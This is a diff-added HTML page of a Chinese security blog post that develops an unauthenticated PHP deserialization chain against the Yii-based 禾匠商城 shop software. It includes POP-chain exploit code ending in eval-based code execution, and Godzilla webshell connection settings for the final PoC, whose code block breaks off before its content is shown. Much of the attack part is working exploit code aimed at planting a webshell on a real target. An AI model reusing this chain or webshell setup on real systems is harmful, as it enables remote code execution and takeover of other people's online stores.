@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="一次项目中遇到了禾匠商城，翻到文章记录了两个历史漏洞，一个密码重置和反序列化，因为不知道管理员用户名，就尝试利用反序列化漏洞。 反序列化漏洞点https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;network&#x2F;334859.html定位到漏洞文件controllers&#x2F;api&#x2F;testOrderSubmit&#x2F;IndexController.php   跟">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次禾匠商城yii反序列化链挖掘">
+<meta property="og:url" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/index.html">
+<meta property="og:site_name" content="N0poInt&#39;s Blog">
+<meta property="og:description" content="一次项目中遇到了禾匠商城，翻到文章记录了两个历史漏洞，一个密码重置和反序列化，因为不知道管理员用户名，就尝试利用反序列化漏洞。 反序列化漏洞点https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;network&#x2F;334859.html定位到漏洞文件controllers&#x2F;api&#x2F;testOrderSubmit&#x2F;IndexController.php   跟">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009101750162.png">
+<meta property="og:image" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009101841935.png">
+<meta property="og:image" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009103037630.png">
+<meta property="og:image" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009104229868.png">
+<meta property="og:image" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009105001197.png">
+<meta property="og:image" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009110123633.png">
+<meta property="og:image" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009111749641.png">
+<meta property="og:image" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009112257328.png">
+<meta property="og:image" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009113206394.png">
+<meta property="og:image" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009113709545.png">
+<meta property="og:image" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009114511593.png">
+<meta property="article:published_time" content="2024-09-26T05:58:06.000Z">
+<meta property="article:modified_time" content="2024-10-09T03:56:08.370Z">
+<meta property="article:author" content="N0poInt">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="yii">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009101750162.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>记一次禾匠商城yii反序列化链挖掘</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&text=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&title=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&is_video=false&description=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次禾匠商城yii反序列化链挖掘&body=Check out this article: http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&title=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&title=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&title=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&title=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&name=记一次禾匠商城yii反序列化链挖掘&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/&t=记一次禾匠商城yii反序列化链挖掘"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">反序列化漏洞点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E7%8E%AF%E5%A2%83%E9%99%90%E5%88%B6"><span class="toc-number">2.</span> <span class="toc-text">目标环境限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98"><span class="toc-number">3.</span> <span class="toc-text">反序列化链挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TemporaryFileByteStream%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-number">3.1.</span> <span class="toc-text">TemporaryFileByteStream入口点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AppendStream"><span class="toc-number">3.2.</span> <span class="toc-text">AppendStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CachingStream-rewind"><span class="toc-number">3.3.</span> <span class="toc-text">CachingStream-&gt;rewind()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PumpStream-read"><span class="toc-number">3.4.</span> <span class="toc-text">PumpStream-&gt;read()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ExpressionDependency-generateDependencyData"><span class="toc-number">3.5.</span> <span class="toc-text">ExpressionDependency-&gt;generateDependencyData()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BEpoc"><span class="toc-number">4.</span> <span class="toc-text">反序列化链poc</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        记一次禾匠商城yii反序列化链挖掘
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">N0poInt</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-26T05:58:06.000Z" class="dt-published" itemprop="datePublished">2024-09-26</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/php/" rel="tag">php</a>, <a class="p-category" href="/tags/yii/" rel="tag">yii</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>一次项目中遇到了禾匠商城，翻到文章记录了两个历史漏洞，一个密码重置和反序列化，因为不知道管理员用户名，就尝试利用反序列化漏洞。</p>
+<h2 id="反序列化漏洞点"><a href="#反序列化漏洞点" class="headerlink" title="反序列化漏洞点"></a>反序列化漏洞点</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/334859.html">https://www.freebuf.com/articles/network/334859.html</a><br>定位到漏洞文件controllers&#x2F;api&#x2F;testOrderSubmit&#x2F;IndexController.php</p>
+<img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009101750162.png" class="">
+<img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009101841935.png" class="">
+<p>跟踪decode方法，这是YII处理序列化数据的典型办法，可以看到如果json_decode失败会调用原生的unserialize来进行反序列化，这就会造成反序列化漏洞了。<br>因为IndexController没有绑定login的behaviors行为，所以这个反序列化是未授权的漏洞。</p>
+<h2 id="目标环境限制"><a href="#目标环境限制" class="headerlink" title="目标环境限制"></a>目标环境限制</h2><p>尝试用文章中的链进行利用，发现失败，有多个限制<br>目标环境设置了disable_functions，php版本是7，<br>BatchQueryResult和FnStream也修复了，增加了__wakeup方法使其不能反序列化</p>
+<img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009103037630.png" class="">
+<p>并且yii反序列化链中的类在禾匠商城中有很多找不到<br>所以需要重新挖掘yii的其他利用链</p>
+<h2 id="反序列化链挖掘"><a href="#反序列化链挖掘" class="headerlink" title="反序列化链挖掘"></a>反序列化链挖掘</h2><h3 id="TemporaryFileByteStream入口点"><a href="#TemporaryFileByteStream入口点" class="headerlink" title="TemporaryFileByteStream入口点"></a>TemporaryFileByteStream入口点</h3><p>通过翻阅文章和审计代码，找到<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254429#h2-19">https://www.anquanke.com/post/id/254429#h2-19</a><br>文章中的TemporaryFileByteStream入口点</p>
+<img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009104229868.png" class="">
+<p>因为这里调用了file_exists代表需要的参数是string类型，这里getPath()返回可控，所以这里就可以执行任意类的__toString方法</p>
+<h3 id="AppendStream"><a href="#AppendStream" class="headerlink" title="AppendStream"></a>AppendStream</h3><p>这里选择的是调用GuzzleHttp\Psr7\AppendStream的__toString方法</p>
+<img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009105001197.png" class="">
+<p>这里执行顺序为<br>vendor\guzzlehttp\psr7\src\AppendStream.php-&gt;__tostring()-&gt;rewind()-&gt;seek()</p>
+<p>然后这里stream可控，所以这里可以调用任意类的rewind方法</p>
+<h3 id="CachingStream-rewind"><a href="#CachingStream-rewind" class="headerlink" title="CachingStream-&gt;rewind()"></a>CachingStream-&gt;rewind()</h3><p>调用CachingStream的rewind方法</p>
+<img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009110123633.png" class="">
+<p>执行顺序为\vendor\guzzlehttp\psr7\src\CachingStream.php-&gt;rewind()-&gt;seek()-&gt;read()<br>这里stream可控所以就可以调用任意类的read方法<br>要执行到read方法要求diff大于0并且满足while条件<br>在其他文章中都是调用Faker\DefaultGenerator类，但是禾匠商城没有这个类，这里选择的是GuzzleHttp\Psr7\BufferStream替代</p>
+<img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009111749641.png" class="">
+<p>目前反序列化链demo如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    class BufferStream&#123;</span><br><span class="line">        private $buffer = &#x27;&#x27;;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;buffer=&quot;123&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    class CachingStream&#123;</span><br><span class="line">        private $remoteStream;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;remoteStream=new BufferStream();</span><br><span class="line">            $this-&gt;stream=new PumpStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    class AppendStream&#123;</span><br><span class="line">        private $streams = [];</span><br><span class="line">        private $seekable = true;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;streams[]=new CachingStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    use GuzzleHttp\Psr7\AppendStream;</span><br><span class="line">    class Swift_ByteStream_FileByteStream &#123;</span><br><span class="line">        private $path;</span><br><span class="line">        public function __construct() &#123;</span><br><span class="line">            $this-&gt;path = new AppendStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    echo urlencode(serialize(new Swift_ByteStream_TemporaryFileByteStream()));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="PumpStream-read"><a href="#PumpStream-read" class="headerlink" title="PumpStream-&gt;read()"></a>PumpStream-&gt;read()</h3><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009112257328.png" class="">
+<p>这里的执行顺序为\vendor\guzzlehttp\psr7\src\PumpStream.php-&gt;read()-&gt;pump()-&gt;call_user_func()<br>其中要执行到call_user_func需要满足if($remaining)条件，需要$data &#x3D; $this-&gt;buffer-&gt;read($length);这段代码返回一个字符串<br>这里调用Behat\Gherkin\Cache\MemoryCache来满足条件</p>
+<img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009113206394.png" class="">
+<p>现在就执行到了call_user_func方法了<br>但是只有第一个参数可控，第二个参数不可控，代表可执行任意方法，但是参数不可控，在其他文章中到这里后下一步都是调用yii&#x2F;rest&#x2F;IndexAction.php的run方法</p>
+<img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009113709545.png" class="">
+<p>这里就可以执行任意方法，并且参数可控，这里只能利用单参数方法，但是因为disable_functions和php版本是7，基本都利用不了了，在其他文章中都是使用反序列化闭包函数来利用的，但是目标环境没这个依赖，所以就要找新的利用点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;../test/closure/autoload.php&quot;);</span><br><span class="line">$a = function()&#123;phpinfo();&#125;;</span><br><span class="line">$a = \Opis\Closure\serialize($a);</span><br><span class="line">$b = unserialize($a);</span><br><span class="line">$this-&gt;source=$b;</span><br></pre></td></tr></table></figure>
+<h3 id="ExpressionDependency-generateDependencyData"><a href="#ExpressionDependency-generateDependencyData" class="headerlink" title="ExpressionDependency-&gt;generateDependencyData()"></a>ExpressionDependency-&gt;generateDependencyData()</h3><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009114511593.png" class="">
+<p>这里eval中的$this-&gt;expression可控，就代表可以直接代码执行<br>但是因为方法的修饰符是protected，不能直接调用，就看ExpressionDependency的父类Dependency中调用generateDependencyData方法的地方<br>这里找的是evaluateDependency方法，到这里就构成了一条代码执行的反序列化链了</p>
+<h2 id="反序列化链poc"><a href="#反序列化链poc" class="headerlink" title="反序列化链poc"></a>反序列化链poc</h2><p>密码:Tas9er 密钥:dkddixN 有效载荷:PhpDynamicPayload 加密器:PHP_XOR_BASE64<br>这里写的哥斯拉马中特殊字符需要转义下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 